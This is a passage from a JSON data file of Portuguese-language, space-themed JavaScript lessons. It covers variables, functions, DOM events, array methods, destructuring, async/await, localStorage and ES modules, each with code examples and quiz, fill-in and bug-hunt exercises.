        "content": "# ⚡ O Reator de Energia: Variáveis & Tipos\n\nBem-vindo ao **Cyber Core**, o coração pulsar da Galáxia de Código! Se o HTML é a estrutura e o CSS é o design, o **JavaScript** é o sistema nervoso autônomo que processa dados, responde a cliques e toma decisões inteligentes.\n\n> **💡 O que é JavaScript?**\n> Criado em 1995 por Brendan Eich em apenas 10 dias, o JavaScript evoluiu para se tornar a linguagem mais utilizada do planeta. Hoje ela roda nos navegadores, nos servidores (Node.js), em satélites e em robôs de inteligência artificial.\n\n---\n\n### 📦 Declarando Dados: `const` vs `let`\n\nNo JavaScript moderno (ES6+), abandonamos a antiga palavra-chave `var` devido a problemas de escopo global e vazamento de variáveis. Hoje seguimos esta regra de ouro:\n\n1. **`const` (Constante):** Use por padrão para quase tudo! Garante que o identificador não pode ser reatribuído:\n   ```javascript\n   const nomeNave = \"Nexus One\";\n   const velocidadeDobra = 9.8;\n   ```\n2. **`let` (Variável Reatribuível):** Use apenas quando o valor for comprovadamente mudar ao longo do tempo (como contadores ou placares):\n   ```javascript\n   let escudos = 100;\n   escudos = 85; // Permitido com let!\n   ```\n\n---\n\n### 🧬 Os Tipos Primitivos do Nexus\n\n- **String:** Textos delimitados por aspas simples, duplas ou crases (Template Literals):\n  ```javascript\n  const piloto = \"Capitã Sarah\";\n  const status = `Piloto ativo: ${piloto}`;\n  ```\n- **Number:** Números inteiros ou decimais: `const xp = 250;`\n- **Boolean:** Verdadeiro ou falso: `const sistemaOnline = true;`\n- **Undefined:** Variável declarada que ainda não recebeu valor.\n- **Null:** Ausência intencional de valor: `let alvoAtual = null;`\n\n> **⚠️ Armadilha Comum:**\n> Tentar reatribuir uma variável declarada com `const` dispara um erro fatal `TypeError: Assignment to constant variable`. Se a variável precisa variar, declare-a com `let`!\n\n> **🛡️ Boa Prática:**\n> Sempre prefira comparações estritas com três iguais (`===`). O operador duplo (`==`) faz coerções de tipo bizarras (ex: `0 == false` é verdadeiro, mas `0 === false` é falso como esperado).",
        "codeExample": "// Painel de Telemetria do Cyber Core\nconst nomeAgente = \"Neo\";\nlet nivelAcesso = 1;\nconst sistemaOperacional = \"NexusOS v4\";\n\n// Subindo de nível na academia\nnivelAcesso += 1;\n\nconsole.log(`Agente: ${nomeAgente} | Nível: ${nivelAcesso}`);",
        "exercises": [
          {
            "type": "quiz",
            "question": "Por que o padrão da indústria moderna recomenda declarar variáveis com \"const\" por padrão em vez de \"let\"?",
            "options": [
              "Porque variáveis \"const\" rodam 10 vezes mais rápido na CPU.",
              "Porque \"const\" previne reatribuições acidentais de valor, tornando o código mais previsível e seguro.",
              "Porque \"let\" não funciona em navegadores modernos.",
              "Porque \"const\" permite criar variáveis sem nenhum valor inicial."
            ],
            "correctIndex": 1,
            "explanation": "Usar const por padrão expressa intenção clara de que aquele valor é estável, prevenindo bugs onde uma variável é sobrescrita acidentalmente em outra parte do código."
          },
          {
            "type": "fillblank",
            "title": "Cálculo de Energia da Estação",
            "instruction": "Complete a declaração da constante do piloto e a variável reatribuível de nível de energia.",
            "codeSnippet": "{{declarador_imutavel}} comandante = \"Aria\";\n{{declarador_mutavel}} nivelBateria = 100;\nnivelBateria = 90;",
            "blanks": [
              {
                "id": "declarador_imutavel",
                "placeholder": "palavra-chave imutável",
                "expectedValues": [
                  "const"
                ],
                "hint": "Palavra-chave usada para variáveis que nunca serão reatribuídas."
              },
              {
                "id": "declarador_mutavel",
                "placeholder": "palavra-chave mutável",
                "expectedValues": [
                  "let"
                ],
                "hint": "Palavra-chave usada quando a variável precisa ter seu valor alterado depois."
              }
            ],
            "explanation": "Perfeito! Usar const para o comandante e let para a bateria reflete as melhores práticas de JavaScript moderno."
          },
          {
            "type": "bughunt",
            "title": "Sobrecarga no Gerador Quântico",
            "scenario": "O robô de telemetria tentou incrementar a pontuação de XP do jogador, mas o console acusou \"TypeError: Assignment to constant variable\".",
            "buggyCode": "const xpJogador = 50;\nxpJogador = xpJogador + 25;\nconsole.log(xpJogador);",
            "expectedKeywords": [
              "let xpJogador = 50;",
              "xpJogador = xpJogador + 25;"
            ],
            "forbiddenKeywords": [
              "const xpJogador = 50;"
            ],
            "hint": "A variável xpJogador está sendo reatribuída na linha seguinte. Qual palavra-chave permite que o valor mude?",
            "solutionExplanation": "Excelente depuração! Trocando const por let na declaração inicial, a variável agora pode receber novos valores sem estourar erros de runtime."
          }
        ]
      },
      {
        "id": "js-2",
        "title": "2. Funções Quânticas & Lógica de Decisão",
        "description": "Construa blocos de código reutilizáveis com funções, arrow functions e operadores lógicos.",
        "duration": 16,
        "xpReward": 65,
        "language": "javascript",
        "content": "# 🧠 Funções & Lógica de Decisão\n\nFunções são os motores de ação do JavaScript. Em vez de repetir linhas de cálculo dez vezes, você encapsula a lógica dentro de uma função e a executa sempre que necessário.\n\n---\n\n### ⚙️ Declarando Funções no JavaScript\n\nExistem duas formas principais de escrever funções:\n\n1. **Função Tradicional (`function`):**\n   ```javascript\n   function calcularDano(ataque, defesa) {\n     return ataque - defesa;\n   }\n   ```\n2. **Arrow Function (`=>`):** A sintaxe mais enxuta introduzida no ES6:\n   ```javascript\n   const calcularDano = (ataque, defesa) => {\n     return ataque - defesa;\n   };\n   ```\n   Se a função tiver apenas uma instrução de retorno, você pode omitir as chaves e a palavra `return`:\n   ```javascript\n   const dobrar = (n) => n * 2;\n   ```\n\n---\n\n### 🔀 Tomada de Decisão: `if`, `else` & Operador Ternário\n\nO computador decide caminhos com base em condições booleanas:\n\n```javascript\nif (energia >= 50) {\n  ativarPropulsores();\n} else if (energia > 10) {\n  ativarModoEconomia();\n} else {\n  ativarSinalSocorro();\n}\n```\n\nPara decisões simples de atribuição, use o **operador ternário**:\n\n```javascript\nconst status = energia > 20 ? \"Operacional\" : \"Crítico\";\n```\n\n> **💡 Dica Pro:**\n> Funções puras (que recebem argumentos e retornam um resultado sem modificar variáveis externas) são muito mais fáceis de testar e debugar. Sempre que puder, faça suas funções retornarem valores com `return` em vez de alterar o mundo lá fora.\n\n> **⚠️ Armadilha Comum:**\n> Esquecer a palavra `return` dentro de uma função que usa chaves faz com que ela retorne `undefined` por padrão!",
        "codeExample": "// Sistema de Autorização de Salto Hiperespacial\nconst verificarAutorizacao = (credencial, nivelEnergia) => {\n  if (credencial === \"OFICIAL\" && nivelEnergia >= 80) {\n    return \"SALTO_AUTORIZADO\";\n  }\n  return \"SALTO_NEGADO\";\n};\n\nconst resultado = verificarAutorizacao(\"OFICIAL\", 95);\nconsole.log(resultado); // \"SALTO_AUTORIZADO\"",
        "exercises": [
          {
            "type": "quiz",
            "question": "O que uma função JavaScript retorna por padrão se o corpo da função terminar sem executar nenhum comando \"return\"?",
            "options": [
              "Retorna o número 0.",
              "Retorna uma string vazia \"\".",
              "Retorna o valor especial undefined.",
              "Dispara um erro fatal de compilação."
            ],
            "correctIndex": 2,
            "explanation": "No JavaScript, qualquer função que não especifique explicitamente um valor de retorno devolve undefined por definição da linguagem."
          },
          {
            "type": "code",
            "instruction": "Crie uma função chamada calcularBonus que recebe um parâmetro pontuacao. Se pontuacao for maior ou igual a 100, retorne 50. Caso contrário, retorne 10.",
            "initialCode": "// Escreva a função calcularBonus abaixo\n",
            "expectedKeywords": [
              "function calcularBonus",
              "pontuacao",
              "return",
              "50",
              "10"
            ],
            "hint": "Declare a função com function calcularBonus(pontuacao) {. Use if (pontuacao >= 100) return 50; else return 10;.",
            "solution": "function calcularBonus(pontuacao) {\n  if (pontuacao >= 100) {\n    return 50;\n  }\n  return 10;\n}"
          },
          {
            "type": "bughunt",
            "title": "O Scanner Sem Retorno",
            "scenario": "O scanner de radar deveria devolver a distância calculada, mas quem chama a função sempre recebe undefined.",
            "buggyCode": "function escanearAlvo(coordenadaX, coordenadaY) {\n  const distancia = Math.sqrt(coordenadaX ** 2 + coordenadaY ** 2);\n  // O valor foi calculado, mas nunca devolvido!\n}\n\nconst resultado = escanearAlvo(3, 4);\nconsole.log(resultado);",
            "expectedKeywords": [
              "return distancia;"
            ],
            "forbiddenKeywords": [
              "// O valor foi calculado, mas nunca devolvido!"
            ],
            "hint": "Adicione a palavra-chave de retorno na última linha da função para enviar a variável distancia de volta a quem a chamou.",
            "solutionExplanation": "Perfeito! Com return distancia;, a função agora entrega o resultado do cálculo para a variável que a invocou."
          }
        ]
      },
      {
        "id": "js-3",
        "title": "3. Interatividade Viva: O DOM & Eventos",
        "description": "Aprenda a selecionar elementos HTML e responder a cliques e ações do usuário.",
        "duration": 17,
        "xpReward": 65,
        "language": "javascript",
        "content": "# ⚡ Interatividade Viva: O DOM & Eventos\n\nAté agora seu código executou cálculos internos. Chegou o momento mais empolgante: **fazer o JavaScript controlar os elementos visuais na tela**!\n\n---\n\n### 🌲 O que é o DOM (Document Object Model)?\n\nO **DOM** é a representação em árvore que o navegador cria para cada tag HTML da sua página. No JavaScript, você pode acessar e manipular essa árvore usando o objeto global `document`.\n\nPara encontrar qualquer elemento usando a mesma sintaxe de seletores do CSS:\n\n```javascript\nconst botao = document.querySelector(\"#btn-lancar\");\nconst titulo = document.querySelector(\".titulo-missao\");\n```\n\n---\n\n### 👂 Escutando Ações com `addEventListener`\n\nPara responder a um clique do mouse, pressionamento de tecla ou envio de formulário, registramos um ouvinte de eventos:\n\n```javascript\nconst botao = document.querySelector(\"#btn-lancar\");\n\nbotao.addEventListener(\"click\", () => {\n  console.log(\"Foguete lançado!\");\n  titulo.textContent = \"Missão em Andamento!\";\n});\n```\n\n---\n\n### 🎨 Alterando Textos e Estilos Dinamicamente\n\nCom o elemento em mãos, você tem superpoderes:\n\n- **Alterar texto:** `elemento.textContent = \"Novo texto seguro\";`\n- **Adicionar classe CSS:** `elemento.classList.add(\"ativo\");`\n- **Remover classe CSS:** `elemento.classList.remove(\"oculto\");`\n- **Alternar classe CSS:** `elemento.classList.toggle(\"modo-escuro\");`\n\n> **💡 Dica Pro:**\n> Sempre prefira alterar classes CSS via `classList.add()` ou `toggle()` em vez de alterar estilos inline com `style.color`. Isso mantém o CSS responsável pelo visual e o JavaScript responsável pelo comportamento.\n\n> **⚠️ Armadilha Comum:**\n> Tentar buscar um elemento com `querySelector` antes do HTML ser carregado pelo navegador resulta em `null`. Coloque suas tags `<script>` antes de fechar o `</body>` ou use o atributo `defer`.",
        "codeExample": "// Interceptando a Ignição do Reator\nconst botaoIgnicao = document.querySelector(\"#botao-ignicao\");\nconst statusLuz = document.querySelector(\".status-luz\");\n\nbotaoIgnicao.addEventListener(\"click\", () => {\n  statusLuz.textContent = \"REATOR ONLINE\";\n  statusLuz.classList.add(\"ativo\");\n});",
        "exercises": [
          {
            "type": "quiz",
            "question": "Qual método moderno da API DOM é o mais flexível e recomendado para capturar o primeiro elemento que coincida com um seletor CSS?",
            "options": [
              "document.getElementByIdName()",
              "document.querySelector()",
              "document.captureElement()",
              "document.findCss()"
            ],
            "correctIndex": 1,
            "explanation": "document.querySelector() permite usar qualquer seletor CSS válido (.classe, #id, tag[attr], etc.) para capturar elementos na página com máxima flexibilidade."
          },
          {
            "type": "fillblank",
            "title": "Ativando o Alarme da Estação",
            "instruction": "Preencha os métodos para capturar o botão por ID e registrar o ouvinte de evento de clique.",
            "codeSnippet": "const botaoAlarme = document.{{metodo_selecao}}(\"#btn-alarme\");\n\nbotaoAlarme.{{metodo_ouvinte}}(\"click\", () => {\n  alert(\"Alerta vermelho ativado!\");\n});",
            "blanks": [
              {
                "id": "metodo_selecao",
                "placeholder": "método seletor",
                "expectedValues": [
                  "querySelector"
                ],
                "hint": "Método padrão do objeto document que aceita seletores CSS."
              },
              {
                "id": "metodo_ouvinte",
                "placeholder": "método ouvinte",
                "expectedValues": [
                  "addEventListener"
                ],
                "hint": "Método chamado no elemento para escutar eventos."
              }
            ],
            "explanation": "Magnífico! document.querySelector e addEventListener são a dupla dinâmica do desenvolvimento web moderno!"
          },
          {
            "type": "code",
            "instruction": "Escreva o código para adicionar um ouvinte de clique ao elemento botao, mudando a propriedade textContent do elemento status para \"SISTEMA ATIVO\".",
            "initialCode": "// Considere que as variáveis \"botao\" e \"status\" já existem\n// Adicione o addEventListener abaixo\n",
            "expectedKeywords": [
              "botao.addEventListener",
              "click",
              "status.textContent",
              "SISTEMA ATIVO"
            ],
            "hint": "Faça botao.addEventListener(\"click\", () => { status.textContent = \"SISTEMA ATIVO\"; });",
            "solution": "botao.addEventListener(\"click\", () => {\n  status.textContent = \"SISTEMA ATIVO\";\n});"
          }
        ]
      },
      {
        "id": "js-4",
        "title": "4. Arrays & Métodos de Alta Ordem (map, filter, reduce)",
        "description": "Processe listas de dados quânticos com funções imutáveis e código limpo e declarativo.",
        "duration": 16,
        "xpReward": 65,
        "language": "javascript",
        "content": "# ⚡ Arrays & Métodos de Alta Ordem (map, filter, reduce)\n\nBem-vindo ao reator principal do Cyber Core! Em JavaScript moderno, manipular listas sem mutação de dados é o que separa cadetes de arquitetos de software.\n\n> **💡 O que são Funções de Alta Ordem (Higher-Order Functions)?**\n> São métodos que recebem outras funções como parâmetro (callbacks) para iterar, filtrar e transformar coleções de dados sem necessidade de loops imperativos como o velho `for(let i = 0...)`.\n\n---\n\n### 🛠️ O Trio Sagrado do JavaScript Moderno\n\n1. **`map()`**: Transforma cada item do array e retorna um **novo array** com o mesmo comprimento:\n```javascript\nconst precosEmCreditos = [100, 250, 400];\nconst precosComTaxa = precosEmCreditos.map(preco => preco * 1.1);\n// [110, 275, 440]\n```\n\n2. **`filter()`**: Avalia uma condição booleana e retorna apenas os itens que passaram no teste:\n```javascript\nconst naves = [\n  { nome: 'Apollo', nivelCombustivel: 20 },\n  { nome: 'Vostok', nivelCombustivel: 85 },\n  { nome: 'Orion', nivelCombustivel: 95 }\n];\nconst navesProntas = naves.filter(nave => nave.nivelCombustivel >= 80);\n```\n\n3. **`reduce()`**: Acumula todos os valores de uma lista em um único resultado final (número, objeto ou string):\n```javascript\nconst despesas = [15, 30, 45, 10];\nconst totalGasto = despesas.reduce((acumulador, item) => acumulador + item, 0);\n// 100\n```\n\n> **⚠️ Armadilha Comum:**\n> Esquecer de fornecer o valor inicial no `reduce` (o segundo argumento, como o `0` acima). Sem ele, o acumulador assume o primeiro item da lista, o que pode causar erros bizarros com listas de objetos!\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Prefira sempre `map`, `filter` e `reduce` a laços `for` tradicionais: eles não causam efeitos colaterais e tornam seu código legível e testável.\n- Lembre-se de que esses métodos **não alteram o array original**; eles sempre retornam uma nova referência na memória.\n\n> **🛡️ Regra de Ouro:**\n> Nunca use `map` quando você não pretende usar o array retornado. Se quiser apenas executar uma ação para cada elemento, use `forEach`.",
        "codeExample": "const cadetes = [\n  { nome: 'Alex', pontuacao: 85, ativo: true },\n  { nome: 'Beatriz', pontuacao: 92, ativo: false },\n  { nome: 'Carlos', pontuacao: 78, ativo: true }\n];\n\n// Encadeamento elegante de métodos\nconst mediaPontosAtivos = cadetes\n  .filter(c => c.ativo)\n  .map(c => c.pontuacao)\n  .reduce((acc, pontos, _, arr) => acc + pontos / arr.length, 0);",
        "exercises": [
          {
            "type": "quiz",
            "question": "Qual método de Array deve ser utilizado quando desejamos selecionar apenas os elementos que atendem a um determinado critério booleano?",
            "options": [
              "Array.prototype.map()",
              "Array.prototype.forEach()",
              "Array.prototype.filter()",
              "Array.prototype.reduce()"
            ],
            "correctIndex": 2,
            "explanation": "O método filter() retorna um novo array contendo apenas os elementos para os quais a função callback retornou verdadeiro."
          },
          {
            "type": "code",
            "instruction": "Dado o array de números \"[10, 20, 30]\", utilize o método .map() para criar uma nova constante \"dobrados\" com o dobro de cada número.",
            "initialCode": "const numeros = [10, 20, 30];\n// Crie a constante dobrados aqui\n",
            "expectedKeywords": [
              "const dobrados",
              "numeros.map",
              "* 2"
            ],
            "hint": "Utilize: const dobrados = numeros.map(n => n * 2);",
            "solution": "const numeros = [10, 20, 30];\nconst dobrados = numeros.map(n => n * 2);"
          }
        ]
      },
      {
        "id": "js-5",
        "title": "5. Objetos, Desestruturação & Spread Operator",
        "description": "Manipule estruturas de dados com sintaxe moderna de desestruturação, rest e spread operator.",
        "duration": 16,
        "xpReward": 65,
        "language": "javascript",
        "content": "# 🧬 Objetos, Desestruturação & Spread Operator\n\nAprofundando no Cyber Core! Objetos são a espinha dorsal de qualquer entidade no JavaScript (usuários, respostas de API, configurações). A sintaxe moderna do ES6+ trouxe superpoderes para lidar com eles.\n\n> **💡 O que é Desestruturação (Destructuring)?**\n> É uma expressão que permite extrair propriedades de objetos ou elementos de arrays diretamente para variáveis distintas com uma sintaxe limpa e sem redundância.\n\n---\n\n### 📦 Desestruturação na Prática\n\nAdeus `const nome = usuario.nome; const nivel = usuario.nivel;`:\n\n```javascript\nconst nave = {\n  identificador: 'NX-900',\n  capitao: 'Elena Vance',\n  motores: { dobra: 4, hiperespaco: true }\n};\n\n// Extraindo dados com renomeação e valor padrão\nconst { identificador, capitao, escudo = 100 } = nave;\nconsole.log(capitao); // 'Elena Vance'\nconsole.log(escudo); // 100 (valor padrão caso seja undefined)\n```\n\n---\n\n### ✨ O Operador Spread (`...`)\n\nO operador de espalhamento copia e combina objetos ou arrays de forma imutável:\n\n```javascript\nconst baseConfig = { tema: 'escuro', som: true, idioma: 'pt-BR' };\n\n// Clonando e sobrescrevendo uma propriedade sem alterar baseConfig\nconst userConfig = {\n  ...baseConfig,\n  som: false,\n  notificacoes: true\n};\n```\n\nTambém funciona perfeitamente para combinar arrays:\n```javascript\nconst tripulantes = ['Alex', 'Lia'];\nconst novosTripulantes = ['Sam', 'Dan'];\nconst todaTripulacao = [...tripulantes, ...novosTripulantes];\n```\n\n> **⚠️ Armadilha Comum:**\n> O spread operator faz um **shallow copy** (cópia rasa). Se o objeto tiver objetos aninhados internos, a referência desses objetos internos continua compartilhada! Para clones profundos, use a função nativa moderna `structuredClone(obj)`.\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Use desestruturação diretamente nos parâmetros de funções: `function renderCard({ titulo, xp }) { ... }`.\n- Nunca modifique objetos recebidos por parâmetro diretamente; sempre crie cópias com spread operator.\n\n> **🛡️ Regra de Ouro:**\n> A imutabilidade previne os bugs mais difíceis de rastrear em aplicações de grande porte.",
        "codeExample": "function conectarModulo({ id, porta = 8080, ...opcoesExtras }) {\n  return {\n    status: 'conectado',\n    url: `ws://servidor:${porta}/${id}`,\n    parametros: opcoesExtras\n  };\n}",
        "exercises": [
          {
            "type": "quiz",
            "question": "O que o operador spread (...) realiza quando utilizado dentro de um objeto literal como em \"{ ...objetoOriginal, ativo: true }\"?",
            "options": [
              "Ele deleta todas as chaves do objeto original para liberar memória.",
              "Ele copia de forma rasa todas as propriedades enumeráveis do objeto original para um novo objeto.",
              "Ele bloqueia o objeto impedindo qualquer nova adição com Object.freeze.",
              "Ele converte o objeto automaticamente para uma string no formato XML."
            ],
            "correctIndex": 1,
            "explanation": "O spread operator espalha as propriedades do objeto original em um novo objeto, permitindo clonagem e composição imutável de dados."
          },
          {
            "type": "code",
            "instruction": "Crie uma função chamada \"clonarComStatus\" que receba um objeto \"item\" e retorne um novo objeto espalhando as propriedades de item e adicionando a chave \"status: 'ativo'\".",
            "initialCode": "// Crie a função clonarComStatus aqui\n",
            "expectedKeywords": [
              "function clonarComStatus",
              "...",
              "status:",
              "'ativo'"
            ],
            "hint": "Use a sintaxe: return { ...item, status: 'ativo' };",
            "solution": "function clonarComStatus(item) {\n  return { ...item, status: 'ativo' };\n}"
          }
        ]
      },
      {
        "id": "js-6",
        "title": "6. Assincronismo: Promises, Async & Await",
        "description": "Domine a comunicação com servidores, requisições de rede com fetch e tratamento de erros com try/catch.",
        "duration": 17,
        "xpReward": 65,
        "language": "javascript",
        "content": "# ⏳ Assincronismo: Promises, Async & Await\n\nAlerta de pulso temporal no Cyber Core! O JavaScript executa em uma única thread (Single Thread). Para buscar dados em servidores distantes sem travar a interface do usuário, utilizamos **código assíncrono**.\n\n> **💡 O que é uma Promise?**\n> Uma Promise é um compromisso futuro. Ela representa um valor que pode estar disponível agora, no futuro ou nunca. Uma Promise tem três estados: **Pending** (pendente), **Fulfilled** (resolvida com sucesso) ou **Rejected** (rejeitada com erro).\n\n---\n\n### 🌐 A Sintaxe Moderna: `async` e `await`\n\nO `async/await` é um recurso elegante que permite escrever código assíncrono com a clareza e legibilidade do código síncrono:\n\n```javascript\nasync function carregarDadosDoCadete(cadeteId) {\n  try {\n    const resposta = await fetch(`https://api.nexus.io/cadetes/${cadeteId}`);\n    \n    if (!resposta.ok) {\n      throw new Error(`Falha na transmissão: status ${resposta.status}`);\n    }\n\n    const dados = await resposta.json();\n    return dados;\n  } catch (erro) {\n    console.error('Erro na ponte de rede:', erro.message);\n    throw erro;\n  }\n}\n```\n\n- **`async`**: Transforma a função para que ela retorne automaticamente uma Promise.\n- **`await`**: Pausa a execução da função de forma não-bloqueante até que a Promise seja concluída.\n- **`try / catch`**: Captura exceções e falhas de conexão de forma centralizada.\n\n---\n\n### 🚀 Execução em Paralelo: `Promise.all()`\n\nSe você precisa buscar 3 dados que não dependem um do outro, nunca use `await` em sequência! Execute-os em paralelo:\n\n```javascript\n// Ruim (sequencial - lento):\n// const p1 = await fetchPlanet();\n// const p2 = await fetchShips();\n\n// Excelente (paralelo - ultrarrápido):\nconst [planetas, naves] = await Promise.all([\n  buscarPlanetas(),\n  buscarNaves()\n]);\n```\n\n> **⚠️ Armadilha Comum:**\n> Achar que o `fetch` cai no bloco `catch` quando o servidor retorna status de erro como `404` ou `500`. O `fetch` só rejeita se houver falha de rede física! Você deve verificar manualmente `if (!resposta.ok)`.\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Sempre envolva chamadas com `await` em blocos `try/catch` para exibir mensagens amigáveis em caso de falha.\n- Adicione timeouts ou utilize o `AbortController` para cancelar requisições que demorem tempo demais.\n\n> **🛡️ Regra de Ouro:**\n> Nunca deixe uma Promise sem tratamento de rejeição (Unhandled Promise Rejection).",
        "codeExample": "async function sincronizarTelemetria() {\n  try {\n    const res = await fetch('/api/telemetria');\n    if (!res.ok) throw new Error('Servidor indisponível');\n    const { status, coordenadas } = await res.json();\n    console.log(`Sincronizado: ${status}`, coordenadas);\n  } catch (err) {\n    console.error('Falha de telemetria:', err);\n  }\n}",
        "exercises": [
          {
            "type": "quiz",
            "question": "Em qual situação o método fetch() nativo rejeita uma Promise e entra diretamente no bloco catch?",
            "options": [
              "Quando o servidor responde com o código HTTP 404 (Não Encontrado).",
              "Quando o servidor responde com erro interno HTTP 500.",
              "Apenas quando ocorre uma falha física de rede ou resolução de DNS e a requisição não pode ser completada.",
              "Sempre que a resposta retornar dados em formato diferente de JSON."
            ],
            "correctIndex": 2,
            "explanation": "O fetch() só rejeita se houver um erro de rede que impeça a conclusão da requisição. Respostas 404 ou 500 ainda são respostas válidas de HTTP e devem ser tratadas checando res.ok."
          },
          {
            "type": "fillblank",
            "title": "Estruturando uma Função Assíncrona com Tratamento de Erro",
            "instruction": "Preencha as palavras-chave para criar a função assíncrona com captura de exceções.",
            "codeSnippet": "___ function obterDados() {\n  ___\n    const res = ___ fetch(\"/api/dados\");\n    return await res.json();\n  } catch (err) {\n    console.error(err);\n  }\n}",
            "blanks": [
              {
                "id": "blank-1",
                "placeholder": "modificador",
                "expectedValues": [
                  "async"
                ],
                "hint": "Palavra-chave que precede uma função assíncrona."
              },
              {
                "id": "blank-2",
                "placeholder": "início do bloco seguro",
                "expectedValues": [
                  "try {",
                  "try"
                ],
                "hint": "Inicia o bloco que tenta executar a ação sujeita a erros."
              },
              {
                "id": "blank-3",
                "placeholder": "espera",
                "expectedValues": [
                  "await"
                ],
                "hint": "Comando que pausa a execução até a Promise ser resolvida."
              }
            ],
            "explanation": "A combinação async / await com try/catch permite lidar com requisições assíncronas com tratamento de falhas seguro."
          }
        ]
      },
      {
        "id": "js-7",
        "title": "7. Persistência de Dados com localStorage & JSON",
        "description": "Salve inventários e dados do cadete no navegador usando a API de Storage e serialização JSON.",
        "duration": 15,
        "xpReward": 65,
        "language": "javascript",
        "content": "# 💾 Persistência de Dados com localStorage & JSON\n\nBem-vindo à câmara de memória permanente do Cyber Core! Quando um usuário fecha a aba do navegador, todas as variáveis da memória RAM evaporam. Para manter o progresso do cadete salvo, utilizamos o **Storage Web**.\n\n> **💡 O que é o localStorage?**\n> É uma API síncrona fornecida pelo navegador que armazena pares de chave-valor (**strings**) sem data de expiração. Os dados persistem mesmo após reiniciar o computador!\n\n---\n\n### 🔄 Serializando com `JSON.stringify` e `JSON.parse`\n\nO `localStorage` só aceita strings puras. Para salvar objetos e arrays complexos, usamos o formato JSON:\n\n```javascript\n// 1. O dado que queremos salvar\nconst perfilCadete = {\n  nome: 'Alex Nexus',\n  xp: 1500,\n  missoesConcluidas: ['html-1', 'css-1']\n};\n\n// 2. Serializando para String e salvando\nconst perfilString = JSON.stringify(perfilCadete);\nlocalStorage.setItem('perfil_salvo', perfilString);\n\n// 3. Recuperando e convertendo de volta para Objeto\nconst dadoBruto = localStorage.getItem('perfil_salvo');\nif (dadoBruto) {\n  const perfilRecuperado = JSON.parse(dadoBruto);\n  console.log(perfilRecuperado.nome); // 'Alex Nexus'\n}\n```\n\n---\n\n### 🧹 Limpeza e Gerenciamento do Storage\n\n- **`localStorage.removeItem('chave')`**: Remove um item específico.\n- **`localStorage.clear()`**: Apaga tudo que o domínio salvou (cuidado!).\n\n> **⚠️ Armadilha Comum:**\n> Passar um objeto diretamente sem serializar: `localStorage.setItem('user', objeto)`. O JavaScript converterá o objeto para a string inútil `\"[object Object]\"`, corrompendo seus dados!\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- **Nunca salve senhas, chaves de API secretas ou cartões de crédito no `localStorage`!** Qualquer script malicioso injetado na página (XSS) tem acesso irrestrito a esse armazenamento.\n- Envolva sempre chamadas de `JSON.parse()` em blocos `try/catch` para prevenir quebras caso o dado tenha sido modificado externamente.\n\n> **🛡️ Regra de Ouro:**\n> O limite típico do localStorage é de aproximadamente 5MB por domínio. Guarde apenas preferências e metadados leves.",
        "codeExample": "function salvarProgresso(faseId, pontuacao) {\n  const chave = `progresso_${faseId}`;\n  const pacote = {\n    pontuacao,\n    dataHora: new Date().toISOString()\n  };\n  localStorage.setItem(chave, JSON.stringify(pacote));\n}\n\nfunction carregarProgresso(faseId) {\n  const chave = `progresso_${faseId}`;\n  const valor = localStorage.getItem(chave);\n  return valor ? JSON.parse(valor) : null;\n}",
        "exercises": [
          {
            "type": "quiz",
            "question": "Por que é indispensável usar JSON.stringify() antes de salvar um objeto JavaScript no localStorage?",
            "options": [
              "Porque o localStorage criptografa automaticamente dados em formato JSON com chave militar.",
              "Porque o localStorage aceita exclusivamente strings, e tentar salvar um objeto direto resulta na string \"[object Object]\".",
              "Para reduzir a memória consumida pelo navegador em 90%.",
              "Porque sem JSON.stringify o navegador impede a renderização de elementos na tela."
            ],
            "correctIndex": 1,
            "explanation": "O localStorage só armazena pares chave/valor no formato texto (string). Objetos devem ser serializados com JSON.stringify()."
          },
          {
            "type": "code",
            "instruction": "Escreva uma linha de código que recupere o item com a chave \"configuracoes\" do localStorage e o converta de JSON para um objeto JavaScript na constante \"config\".",
            "initialCode": "// Escreva a constante config aqui\n",
            "expectedKeywords": [
              "const config",
              "JSON.parse",
              "localStorage.getItem",
              "'configuracoes'"
            ],
            "hint": "Use: const config = JSON.parse(localStorage.getItem('configuracoes'));",
            "solution": "const config = JSON.parse(localStorage.getItem('configuracoes'));"
          }
        ]
      },
      {
        "id": "js-8",
        "title": "8. Módulos ES6 & Arquitetura de Scripts",
        "description": "Divida códigos gigantes em módulos reutilizáveis com import, export, default e padrões limpos.",
        "duration": 17,
        "xpReward": 70,
        "language": "javascript",
        "content": "# 🏛️ Módulos ES6 & Arquitetura de Scripts\n\nMissão final no Cyber Core! Antigamente, scripts eram amontoados em um único arquivo de 5.000 linhas ou dependiam de dezenas de tags `<script>` soltas no HTML. Com os **Módulos ES6** (*ES Modules*), criamos arquiteturas limpas, encapsuladas e de padrão internacional.\n\n> **💡 O que são Módulos ES6?**\n> Um módulo é um arquivo JavaScript autônomo. Variáveis e funções criadas dentro dele são **privadas** por padrão, a menos que sejam explicitamente exportadas com a palavra-chave `export`.\n\n---\n\n### 📤 Exportações Nomeadas vs Exportação Padrão\n\nExistem duas formas principais de exportar dados de um módulo:\n\n1. **Named Exports (Exportações Nomeadas):** Úteis para utilitários e múltiplas funções:\n```javascript\n// arquivo: utilitarios.js\nexport const PI = 3.14159;\nexport function calcularCombustivel(distancia) {\n  return distancia * 1.5;\n}\n```\n\n2. **Default Export (Exportação Padrão):** Ideal para a entidade principal do arquivo (como uma classe ou componente):\n```javascript\n// arquivo: NaveEspacial.js\nexport default class NaveEspacial {\n  constructor(nome) {\n    this.nome = nome;\n  }\n}\n```\n\n---\n\n### 📥 Importando Módulos em Outros Arquivos\n\n```javascript\n// arquivo: main.js\nimport NaveEspacial from './NaveEspacial.js'; // Default import (sem chaves)\nimport { PI, calcularCombustivel } from './utilitarios.js'; // Named imports (com chaves)\n\nconst nave = new NaveEspacial('Nexus One');\nconsole.log(calcularCombustivel(100));\n```\n\n- **Renomeando importações:** `import { calcularCombustivel as calc } from './util.js'`.\n- **Importando tudo:** `import * as MatrizUtils from './utilitarios.js'`.\n\n> **⚠️ Armadilha Comum:**\n> Esquecer de adicionar `type=\"module\"` na tag script do HTML: `<script type=\"module\" src=\"./main.js\"></script>`. Sem esse atributo, o navegador emitirá o erro: *SyntaxError: Cannot use import statement outside a module*.\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Mantenha cada arquivo focado em uma única responsabilidade (Princípio da Responsabilidade Única - SRP).\n- Prefira exportações 